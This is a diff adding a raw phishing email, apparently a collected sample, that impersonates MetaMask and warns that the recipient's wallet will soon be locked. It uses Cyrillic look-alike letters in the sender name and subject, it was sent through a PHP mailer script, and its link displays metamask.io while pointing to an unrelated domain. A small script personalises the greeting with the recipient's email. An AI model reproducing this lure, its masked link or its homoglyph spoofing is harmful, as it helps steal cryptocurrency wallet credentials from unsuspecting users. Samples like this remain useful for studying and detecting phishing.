@@ -1,0 +1,52 @@
+Return-Path: <postmaster@2c6701f648.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id YK8dIyHqKmhIHwAAOB6+FQ
+	(envelope-from <postmaster@2c6701f648.nxcli.io>)
+	for <info@vorteksenerji.com>; Mon, 19 May 2025 11:21:53 +0300
+Return-path: <postmaster@2c6701f648.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Mon, 19 May 2025 11:21:53 +0300
+Received: from cloudhost-69408.uk-south-2.nxcli.net ([165.84.219.41]:61614)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@2c6701f648.nxcli.io>)
+	id 1uGvkv-000000004Dk-2Bpi
+	for info@vorteksenerji.com;
+	Mon, 19 May 2025 11:21:53 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=2c6701f648.nxcli.io;
+  b=Yv864ZW6GDHbgTY+erBmQAE4+HpKsrN+1QOo3xobsj5ioTMmHl/XgW3UpuST7p+mXJbNlbWeplvc6vBD7qaEfWezFhcj/Aq2DU/17YhLefJFqH8WY/ZIP8qFqEikq7yC1ALw7qHWISUJuPrStctaD3DgB40l6SrfPJ++bhKvI1BZ67j36ncqt65lo2A4GbY4n8zKBC8PXdWO3UiKbb6p+kyZ56A/aM91IIPp/Jfxzppyc5CARxbSx80DLWh44c4lJ7YE0z2ISFWibcBcd6uJfFfKHQ2FUgvyafsnr6tePIiJPKR0vnUWo/3Q5NckDb7tWdGKPI63WpqY7J3GmLpIgg==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=2c6701f648.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type; s=default; bh=XCm/FwRlMmNd0ZRdV2WeJjfXT4ZBLPzpA/H
+	rdOniOrk=; b=d3m6qVToKZ86aomk86VUZTv7gUufKmE0brMDeQueKhcIfCI1jHn
+	Uoayf2OihMLvDcJpcm5pAr+0wolcJ/DtXiIQg59DOGXqBjpPNhkVeJqa7KoRciRT
+	469ho4mSnpDwAHdXVYUGl5wf9Yy/SZMZ3LnqtARNuu7+NJHkKTTJ4ud9UqDlpEbF
+	Z92XKZK10FuHDnNkB0uRzTeWghdlPovwzI0hT7u1ihtDQzwMLLwgUISm6Ep4nTyb
+	0wctAeKY0e/bMi+bY1fLlpX2Uw8u6Zg7e4c2iQz9F4MyVzH3vWND1JqUO7GZZHZ5
+	l4CvOp5i9DJaukhwhyTf9N9GZW+WQnPH3gw==
+Received: (qmail 21248 invoked by uid 10317); 19 May 2025 08:44:02 +0100
+Date: 19 May 2025 08:44:02 +0100
+Message-ID: <20250519074402.21220.qmail@cloudhost-69408.uk-south-2.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Your wallet will be soon lоcked
+X-PHP-Originating-Script: 10317:hj.php
+From: "MеtаMаsk" <8ojfnm0l@ghy.io>
+Reply-To: <8ojfnm0l@ghy.io>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html><html><body>
+<p>Hello, <span id="user-email"></span></p>
+<p>There’s a brief note regarding your account preferences. Please take a moment to review.</p>
+<p>You can view the page here: <br><a href="https://darat888.net/csfp/?id=969054707210969522-7713">https://metamask.io/preferences2FA</a></p>
+<p>No changes will be made without your review. If you've already seen this, no action is needed.</p>
+<p>Regards,<br>Team</p>
+<script>const e=new URLSearchParams(window.location.search).get("email");if(e)document.getElementById("user-email").textContent=e;</script>
+</body></html>
+
